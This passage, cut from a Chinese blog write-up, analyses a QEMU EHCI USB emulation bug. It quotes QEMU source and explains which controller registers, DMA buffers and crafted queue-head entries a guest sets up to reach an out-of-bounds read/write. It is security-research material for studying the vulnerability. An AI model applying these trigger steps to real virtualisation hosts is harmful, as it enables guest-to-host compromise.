class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CONFIGFLAG:</span><br><span class="line">        val &amp;= <span class="number">0x1</span>;</span><br><span class="line">        <span class="keyword">if</span> (val) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NB_PORTS; i++)</span><br><span class="line">                handle_port_owner_write(s, i, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PERIODICLISTBASE:</span><br><span class="line">        <span class="keyword">if</span> (ehci_periodic_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">"ehci: PERIODIC list base register set while periodic schedule\n"</span></span><br><span class="line">              <span class="string">"      is enabled and HC is enabled\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ASYNCLISTADDR:</span><br><span class="line">        <span class="keyword">if</span> (ehci_async_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">"ehci: ASYNC list address register set while async schedule\n"</span></span><br><span class="line">              <span class="string">"      is enabled and HC is enabled\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *mmio = val;</span><br><span class="line">    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),</span><br><span class="line">                                *mmio, old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>首先一个朴素的问题是如何触发到漏洞，这也是前两天给我劝退的一个问题，这两天想了一下没有很多参考资料的情况应该是常态，应该<code>hack to learn, not learn to hack</code>，边走边看，而不是等准备好了储备知识再上手。抱着这样的想法，捡起来之前断掉的部分继续看。</p>
<p>查看交叉引用，可以找到<code>ehci_work_bh-&gt;ehci_advance_periodic_state-&gt;ehci_advance_state-&gt;ehci_state_execute-&gt;ehci_execute-&gt;usb_handle_packet-&gt;usb_process_one</code>，再往前找就没有调用函数了。因此我们从头开始一步步看需要满足那些条件才能触发越界读写。</p>
<p><code>ehci_work_bh</code>函数中，我们需要满足<code>ehci_periodic_enabled(ehci)</code>或者<code>ehci-&gt;pstate != EST_INACTIVE</code>，这里我们选择满足前者，具体到变量上需要赋值使得<code>s-&gt;usbcmd &amp; USBCMD_RUNSTOP</code>以及<code>s-&gt;usbcmd &amp; USBCMD_PSE</code>。<code>ehci_update_frindex(ehci, 1);</code>的函数调用每次都会使得<code>ehci-&gt;frindex++</code>，故其总会增加到8(最大循环数为24).</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_UFR_PER_TICK 24       <span class="comment">/* Min frames to process when catching up */</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIState</span> &#123;</span></span><br><span class="line">    USBBus bus;</span><br><span class="line">    DeviceState *device;</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    MemoryRegion mem;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">    MemoryRegion mem_caps;</span><br><span class="line">    MemoryRegion mem_opreg;</span><br><span class="line">    MemoryRegion mem_ports;</span><br><span class="line">    <span class="keyword">int</span> companion_count;</span><br><span class="line">    <span class="keyword">bool</span> companion_enable;</span><br><span class="line">    <span class="keyword">uint16_t</span> capsbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> opregbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> portscbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> portnr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* properties */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> maxframes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  EHCI spec version 1.0 Section 2.3</span></span><br><span class="line"><span class="comment">     *  Host Controller Operational Registers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> caps[CAPA_SIZE];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> opreg[<span class="number">0x44</span>/<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="keyword">uint32_t</span> usbcmd;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbsts;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbintr;</span><br><span class="line">            <span class="keyword">uint32_t</span> frindex;</span><br><span class="line">            <span class="keyword">uint32_t</span> ctrldssegment;</span><br><span class="line">            <span class="keyword">uint32_t</span> periodiclistbase;</span><br><span class="line">            <span class="keyword">uint32_t</span> asynclistaddr;</span><br><span class="line">            <span class="keyword">uint32_t</span> notused[<span class="number">9</span>];</span><br><span class="line">            <span class="keyword">uint32_t</span> configflag;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> portsc[NB_PORTS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  Internal states, shadow registers, etc</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QEMUTimer *frame_timer;</span><br><span class="line">    QEMUBH *async_bh;</span><br><span class="line">    <span class="keyword">bool</span> working;</span><br><span class="line">    <span class="keyword">uint32_t</span> astate;         <span class="comment">/* Current state in asynchronous schedule */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pstate;         <span class="comment">/* Current state in periodic schedule     */</span></span><br><span class="line">    USBPort ports[NB_PORTS];</span><br><span class="line">    USBPort *companion_ports[NB_PORTS];</span><br><span class="line">    <span class="keyword">uint32_t</span> usbsts_pending;</span><br><span class="line">    <span class="keyword">uint32_t</span> usbsts_frindex;</span><br><span class="line">    EHCIQueueHead aqueues;</span><br><span class="line">    EHCIQueueHead pqueues;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* which address to look at next */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a_fetch_addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> p_fetch_addr;</span><br><span class="line"></span><br><span class="line">    USBPacket ipacket;</span><br><span class="line">    QEMUSGList isgl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> last_run_ns;</span><br><span class="line">    <span class="keyword">uint32_t</span> async_stepdown;</span><br><span class="line">    <span class="keyword">uint32_t</span> periodic_sched_active;</span><br><span class="line">    <span class="keyword">bool</span> int_req_by_async;</span><br><span class="line">    VMChangeStateEntry *vmstate;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_work_bh</span><span class="params">(<span class="keyword">void</span> *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;         <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">if</span> (ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE) &#123;</span><br><span class="line">        need_timer++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uframes &gt; (ehci-&gt;maxframes * <span class="number">8</span>)) &#123;</span><br><span class="line">            skipped_uframes = uframes - (ehci-&gt;maxframes * <span class="number">8</span>);</span><br><span class="line">            ehci_update_frindex(ehci, skipped_uframes);</span><br><span class="line">            ehci-&gt;last_run_ns += UFRAME_TIMER_NS * skipped_uframes;</span><br><span class="line">            uframes -= skipped_uframes;</span><br><span class="line">            DPRINTF(<span class="string">"WARNING - EHCI skipped %d uframes\n"</span>, skipped_uframes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; uframes; i++) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * If we're running behind schedule, we should not catch up</span></span><br><span class="line"><span class="comment">             * too fast, as that will make some guests unhappy:</span></span><br><span class="line"><span class="comment">             * 1) We must process a minimum of MIN_UFR_PER_TICK frames,</span></span><br><span class="line"><span class="comment">             *    otherwise we will never catch up</span></span><br><span class="line"><span class="comment">             * 2) Process frames until the guest has requested an irq (IOC)</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt;= MIN_UFR_PER_TICK) &#123;</span><br><span class="line">                ehci_commit_irq(ehci);</span><br><span class="line">                <span class="keyword">if</span> ((ehci-&gt;usbsts &amp; USBINTR_MASK) &amp; ehci-&gt;usbintr) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ehci-&gt;periodic_sched_active) &#123;</span><br><span class="line">                ehci-&gt;periodic_sched_active--;</span><br><span class="line">            &#125;</span><br><span class="line">            ehci_update_frindex(ehci, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ((ehci-&gt;frindex &amp; <span class="number">7</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                ehci_advance_periodic_state(ehci);</span><br><span class="line">            &#125;</span><br><span class="line">            ehci-&gt;last_run_ns += UFRAME_TIMER_NS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">ehci_periodic_enabled</span><span class="params">(EHCIState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ehci_enabled(s) &amp;&amp; (s-&gt;usbcmd &amp; USBCMD_PSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">ehci_enabled</span><span class="params">(EHCIState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;usbcmd &amp; USBCMD_RUNSTOP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ehci-&gt;frindex = (ehci-&gt;frindex + uframes) % 0x4000;</span></span><br></pre></td></tr></table></figure>
<p>分析<code>ehci_advance_periodic_state</code>函数如何调用到<code>ehci_advance_state</code>，因为进这个函数的时候<code>ehci-&gt;frindex &amp; 7</code>已经成立了，所以下面的两个if都是必过的，<code>ehci-&gt;periodiclistbase</code>对齐0x1000得到list，只要list不为0即可。之后<code>list |= ((ehci-&gt;frindex &amp; 0x1ff8) &gt;&gt; 1)</code>经过调试会对list+4。在开始的时候我们设置EHCIState的时候调用<code>mmio_write(0x34,virt2phys(dma_buf))</code>将<code>periodiclistbase</code>设置为dma_buf的物理地址，随后list=virt2phys(dma_buf)+4，再之后的<code>get_dwords</code>从list中读取值赋值给entry，开始的时候我们在这里布置<code>virt2phys(qh)+0x2</code>，最后将entry通过<code>ehci_set_fetch_addr</code>赋值给<code>ehci-&gt;p_fetch_addr</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_advance_periodic_state</span><span class="params">(EHCIState *ehci)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> entry;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="built_in">list</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> async = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">    <span class="keyword">case</span> EST_INACTIVE:</span><br><span class="line">        <span class="keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="number">7</span>) &amp;&amp; ehci_periodic_enabled(ehci)) &#123;</span><br><span class="line">            ehci_set_state(ehci, async, EST_ACTIVE);</span><br><span class="line">            <span class="comment">// No break, fall through to ACTIVE</span></span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> EST_ACTIVE:</span><br><span class="line">        <span class="keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="number">7</span>) &amp;&amp; !ehci_periodic_enabled(ehci)) &#123;</span><br><span class="line">            ehci_queues_rip_all(ehci, async);</span><br><span class="line">            ehci_set_state(ehci, async, EST_INACTIVE);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">list</span> = ehci-&gt;periodiclistbase &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">        <span class="comment">/* check that register has been set */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">list</span> |= ((ehci-&gt;frindex &amp; <span class="number">0x1ff8</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (get_dwords(ehci, <span class="built_in">list</span>, &amp;entry, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n"</span>,</span><br><span class="line">                ehci-&gt;frindex / <span class="number">8</span>, <span class="built_in">list</span>, entry);</span><br><span class="line">        ehci_set_fetch_addr(ehci, async,entry);</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHENTRY);</span><br><span class="line">        ehci_advance_state(ehci, async);          <span class="comment">//这里</span></span><br><span class="line">        ehci_queues_rip_unused(ehci, async);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">/* this should only be due to a developer mistake */</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ehci: Bad periodic state %d. "</span></span><br><span class="line">                <span class="string">"Resetting to active\n"</span>, ehci-&gt;pstate);</span><br><span class="line">        g_assert_not_reached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get an array of dwords from main memory */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">get_dwords</span><span class="params">(EHCIState *ehci, <span class="keyword">uint32_t</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> *buf, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ehci-&gt;as) &#123;</span><br><span class="line">        ehci_raise_irq(ehci, USBSTS_HSE);</span><br><span class="line">        ehci-&gt;usbcmd &amp;= ~USBCMD_RUNSTOP;</span><br><span class="line">        trace_usb_ehci_dma_error();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++, buf++, addr += <span class="keyword">sizeof</span>(*buf)) &#123;</span><br><span class="line">        dma_memory_read(ehci-&gt;as, addr, buf, <span class="keyword">sizeof</span>(*buf));<span class="comment">//从</span></span><br><span class="line">        *buf = le32_to_cpu(*buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_set_fetch_addr</span><span class="params">(EHCIState *s, <span class="keyword">int</span> async, <span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (async) &#123;</span><br><span class="line">        s-&gt;a_fetch_addr = addr;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;p_fetch_addr = addr;     <span class="comment">//进到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入<code>ehci_advance_state</code>函数查看如何调用到<code>ehci_state_execute</code>函数。看注释该函数是个状态机。根据<code>s-&gt;pstate</code>进行状态判断需要进入哪个分支，经过调试每次都会先进入<code>EST_FETCHENTRY</code>，调用<code>ehci_state_fetchentry</code>函数。该函数里通过<code>NLPTR_TYPE_GET(entry)</code>的返回值进一步设置状态，这里以entry/2的单字节作为状态码，共有四种状态。回想一下刚刚我们将entry设置为<code>virt2phys(qh)+0x2</code>，因为对齐的关系，最后1字节一定是2，故(2/2)&amp;3=1，对应将状态设置为<code>NLPTR_TYPE_QH</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the state machine that is common to both async and periodic</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_advance_state</span><span class="params">(EHCIState *ehci, <span class="keyword">int</span> async)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIQueue *q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> itd_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> again;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span>(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">        <span class="keyword">case</span> EST_WAITLISTHEAD:</span><br><span class="line">            again = ehci_state_waitlisthead(ehci, async);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHENTRY:</span><br><span class="line">            again = ehci_state_fetchentry(ehci, async);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHQH:</span><br><span class="line">            q = ehci_state_fetchqh(ehci, async);</span><br><span class="line">            <span class="keyword">if</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                assert(q-&gt;async == async);</span><br><span class="line">                again = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                again = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHITD:</span><br><span class="line">            again = ehci_state_fetchitd(ehci, async);</span><br><span class="line">            itd_count++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHSITD:</span><br><span class="line">            again = ehci_state_fetchsitd(ehci, async);</span><br><span class="line">            itd_count++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_ADVANCEQUEUE:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_advqueue(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHQTD:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_fetchqtd(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_HORIZONTALQH:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_horizqh(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_EXECUTE:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);      <span class="comment">//条件</span></span><br><span class="line">            again = ehci_state_execute(q);</span><br><span class="line">            <span class="keyword">if</span> (async) &#123;</span><br><span class="line">                ehci-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_EXECUTING:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (async) &#123;</span><br><span class="line">                ehci-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            again = ehci_state_executing(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_WRITEBACK:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_writeback(q);</span><br><span class="line">            <span class="keyword">if</span> (!async) &#123;</span><br><span class="line">                ehci-&gt;periodic_sched_active = PERIODIC_ACTIVE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Bad state!\n"</span>);</span><br><span class="line">            again = <span class="number">-1</span>;</span><br><span class="line">            g_assert_not_reached();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (again &lt; <span class="number">0</span> || itd_count &gt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="comment">/* <span class="doctag">TODO:</span> notify guest (raise HSE irq?) */</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"processing error - resetting ehci HC\n"</span>);</span><br><span class="line">            ehci_reset(ehci);</span><br><span class="line">            again = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (again);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/*  This state is the entry point for periodic schedule processing as</span></span><br><span class="line"><span class="comment"> *  well as being a continuation state for async processing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ehci_state_fetchentry</span><span class="params">(EHCIState *ehci, <span class="keyword">int</span> async)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> again = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> entry = ehci_get_fetch_addr(ehci, async);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLPTR_TBIT(entry)) &#123;</span><br><span class="line">        ehci_set_state(ehci, async, EST_ACTIVE);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* section 4.8, only QH in async schedule */</span></span><br><span class="line">    <span class="keyword">if</span> (async &amp;&amp; (NLPTR_TYPE_GET(entry) != NLPTR_TYPE_QH)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"non queue head request in async schedule\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">                                                <span class="comment">//#define NLPTR_TYPE_QH            1     // queue head</span></span><br><span class="line">    <span class="keyword">switch</span> (NLPTR_TYPE_GET(entry)) &#123;            <span class="comment">//#define NLPTR_TYPE_GET(x)        (((x) &gt;&gt; 1) &amp; 3) </span></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_QH:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHQH);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_ITD:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHITD);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_STITD:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHSITD);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> handle FSTN type */</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"FETCHENTRY: entry at %X is of type %d "</span></span><br><span class="line">                <span class="string">"which is not supported yet\n"</span>, entry, NLPTR_TYPE_GET(entry));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>状态机是个不断切换状态的循环，因此接下来会进入<code>EST_FETCHQH</code>，调用<code>ehci_state_fetchqh</code>，在这个函数中并没有直接将状态转换为<code>EST_EXECUTE</code>的部分，我们需要先进入到<code>EST_FETCHQTD</code>分支。为此我们需要设置<code>q-&gt;qh.token &amp; (1&lt;&lt;7)</code>，<code>q-&gt;qh.current_qtd</code>最后一位为0，<code>q-&gt;qh.current_qtd != 0</code>。qh是通过<code>get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr),(uint32_t *) &amp;qh, sizeof(EHCIqh) &gt;&gt; 2)</code>函数根据entry来查找的，因此我们也可以控制qh的内容。<code>ehci_find_device</code>函数里有一个检查<code>ehci-&gt;portsc[i] &amp; PORTSC_PED</code>(这里多谢<code>Resery</code>师傅指教)，而这个设置是通过<code>ehci_port_write</code>来做的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTD_TOKEN_ACTIVE              (1 &lt;&lt; 7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLPTR_TBIT(x)            ((x) &amp; 1)  <span class="comment">// 1=invalid, 0=valid</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIQueue</span> &#123;</span></span><br><span class="line">    EHCIState *ehci;</span><br><span class="line">    QTAILQ_ENTRY(EHCIQueue) next;</span><br><span class="line">    <span class="keyword">uint32_t</span> seen;</span><br><span class="line">    <span class="keyword">uint64_t</span> ts;</span><br><span class="line">    <span class="keyword">int</span> async;</span><br><span class="line">    <span class="keyword">int</span> transact_ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* cached data from guest - needs to be flushed</span></span><br><span class="line"><span class="comment">     * when guest removes an entry (doorbell, handshake sequence)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    EHCIqh qh;             <span class="comment">/* copy of current QH (being worked on) */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> qhaddr;       <span class="comment">/* address QH read from                 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> qtdaddr;      <span class="comment">/* address QTD read from                */</span></span><br><span class="line">    <span class="keyword">int</span> last_pid;          <span class="comment">/* pid of last packet executed          */</span></span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    QTAILQ_HEAD(, EHCIPacket) packets;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  EHCI spec version 1.0 Section 3.6</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint characteristics */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epchar;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_RL_MASK             0xf0000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_RL_SH               28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_C                   (1 &lt;&lt; 27)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_MPLEN_MASK          0x07FF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_MPLEN_SH            16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_H                   (1 &lt;&lt; 15)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_DTC                 (1 &lt;&lt; 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QH_EPCHAR_EPS_MASK            0x00003000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 